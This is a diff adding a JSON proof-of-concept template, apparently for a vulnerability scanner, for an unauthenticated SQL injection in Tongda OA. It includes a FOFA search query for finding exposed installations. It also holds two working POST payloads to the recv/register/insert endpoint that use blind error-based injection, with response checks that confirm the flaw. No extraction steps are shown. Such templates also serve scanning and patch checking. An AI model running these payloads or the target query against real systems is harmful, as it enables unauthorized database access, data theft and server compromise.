@@ -1,0 +1,96 @@
+{
+  "Name": "tongda OA front end sqli",
+  "Description": "通达OA是中国协同办公自动化软件(OA软件)普及型的旗舰产品。该系统存在sql注入漏洞（无需登录），可能造成数据泄漏，甚至服务器被入侵。",
+  "Product": "通达OA",
+  "Homepage": "http://www.tongda2000.com/",
+  "DisclosureDate": "2020-08-18",
+  "Author": "itardc@163.com",
+  "FofaQuery": "app=\"通达OA\" || app=\"TongDa-OA\" || app=\"TongTa-OA\" || app=\"TDXK-通达OA\"",
+  "GobyQuery": "",
+  "Level": "3",
+  "Impact": "",
+  "Recommendation": "",
+  "References": [
+    "http://www.tongda2000.com/",
+    "https://mp.weixin.qq.com/s/zH13q6xBRc58ggHqfKKi_g"
+  ],
+  "HasExp": true,
+  "ExpParams": [
+    {
+      "name": "AttackType",
+      "type": "select",
+      "value": "SessionID"
+    }
+  ],
+  "ExpTips": {
+    "Type": "",
+    "Content": ""
+  },
+  "ScanSteps": [
+    "AND",
+    {
+      "Request": {
+        "data": "title)values(\"'\"^exp(if(ascii(substr(MOD(5,2),1,1))<128,1,710)))# =1&_SERVER=",
+        "data_type": "text",
+        "follow_redirect": false,
+        "header": {"Content-Type": "application/x-www-form-urlencoded"},
+        "method": "POST",
+        "uri": "/general/document/index.php/recv/register/insert"
+      },
+      "ResponseTest": {
+        "checks": [
+          {
+            "bz": "",
+            "operation": "==",
+            "type": "item",
+            "value": "302",
+            "variable": "$code"
+          },
+          {
+            "bz": "",
+            "operation": "contains",
+            "type": "item",
+            "value": "recv/register",
+            "variable": "$head"
+          }
+        ],
+        "operation": "AND",
+        "type": "group"
+      }
+    },
+    {
+      "Request": {
+        "data": "title)values(\"'\"^exp(if(ascii(substr(MOD(5,2),1,1))>128,1,710)))# =1&_SERVER=",
+        "data_type": "text",
+        "follow_redirect": false,
+        "header": {"Content-Type": "application/x-www-form-urlencoded"},
+        "method": "POST",
+        "uri": "/general/document/index.php/recv/register/insert"
+      },
+      "ResponseTest": {
+        "checks": [
+          {
+            "bz": "",
+            "operation": "==",
+            "type": "item",
+            "value": "500",
+            "variable": "$code"
+          }
+        ],
+        "operation": "AND",
+        "type": "group"
+      }
+    }
+  ],
+  "ExploitSteps": null,
+  "Tags": ["sqli", "unauthorized"],
+  "CVEIDs": null,
+  "CVSSScore": null,
+  "AttackSurfaces": {
+    "Application": ["TongDa-OA"],
+    "Support": null,
+    "Service": null,
+    "System": null,
+    "Hardware": null
+  }
+}
